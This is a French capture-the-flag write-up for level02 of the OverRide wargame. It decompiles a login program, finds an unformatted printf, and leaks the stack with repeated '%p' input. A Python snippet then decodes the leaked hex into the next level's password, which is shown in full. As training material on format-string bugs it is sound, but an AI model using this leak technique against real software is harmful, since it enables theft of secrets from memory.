# **Level 02**

Code decompiler:

```
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long lVar3;
  undefined8 *puVar4;
  undefined8 local_118 [14];
  undefined8 local_a8 [6];
  undefined8 local_78 [12];
  int local_14;
  FILE *local_10;
  
  puVar4 = local_78;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined4 *)puVar4 = 0;
  puVar4 = local_a8;
  for (lVar3 = 5; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined *)puVar4 = 0;
  puVar4 = local_118;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined4 *)puVar4 = 0;
  local_10 = (FILE *)0x0;
  local_14 = 0;
  local_10 = fopen("/home/users/level03/.pass","r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  sVar2 = fread(local_a8,1,0x29,local_10);
  local_14 = (int)sVar2;
  sVar2 = strcspn((char *)local_a8,"\n");
  *(undefined *)((long)local_a8 + sVar2) = 0;
  if (local_14 != 0x29) {
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
                    // WARNING: Subroutine does not return
    exit(1);
  }
  fclose(local_10);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets((char *)local_78,100,stdin);
  sVar2 = strcspn((char *)local_78,"\n");
  *(undefined *)((long)local_78 + sVar2) = 0;
  printf("--[ Password: ");
  fgets((char *)local_118,100,stdin);
  sVar2 = strcspn((char *)local_118,"\n");
  *(undefined *)((long)local_118 + sVar2) = 0;
  puts("*****************************************");
  iVar1 = strncmp((char *)local_a8,(char *)local_118,0x29);
  if (iVar1 == 0) {
    printf("Greetings, %s!\n",local_78);
    system("/bin/sh");
    return 0;
  }
  printf((char *)local_78);
  puts(" does not have access!");
                    // WARNING: Subroutine does not return
  exit(1);
}
```
On remarque tres vite un `printf` qui n'est pas au bon `format` a la ligne 75 `printf((char *)local_78);`
Nous serons donc probablement sur un exploit `Format string attack`
Testons un peu le programme,
```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: test
*****************************************
test does not have access!
```
Maintenant avec du format pris en charge par printf, sachat que le printf mal former affiche l'username,
```
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p
--[ Password: test
*****************************************
0x7fffffffe4f0 does not have access!
```
De plus, on peut voir dans le code que le `.pass` du `user suivant` est `stocker` dans la `stack` apres un open puis un read.
Donc si l'on affiche des %p avec notre printf, nous devrions voir notre .pass apparaitre
```
level02@OverRide:~$ (python -c "print '%p '*200"; python -c "print 'test'") > /var/crash/file
level02@OverRide:~$ cat /var/crash/file - | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8
0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025
0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520
0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070
0x100207025 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758
0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520
0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```
On voit donc en sortie, notre enchainement de `702520` qui correspond a `'%p '` une suite de characteres pui de nouveau notre enchainement,
Penchons nous sur ces characteres:
`0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`
Si on decode de l'hexa vers l'ascii la premiere suite (en enlevant le 0x au prealable), on obtient `unPR47hH`,
Or on sait que les adresses sont notees en little endian, donc il faut reverse le resultat, ce qui donne `Hh74RPnu`.
Faisons sur le tout,
```
decrypt.py

l = "756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d"
l = l.split()
for s in l:
	print(bytearray.fromhex(s).decode()[::-1], end="")
print("")

```
```
python decrypt.py 
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
testons ce password pour level03,
```
level02@OverRide:~$ su level03
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
```
> ### NEXT : [Level 03](/level03/resources/README.md)
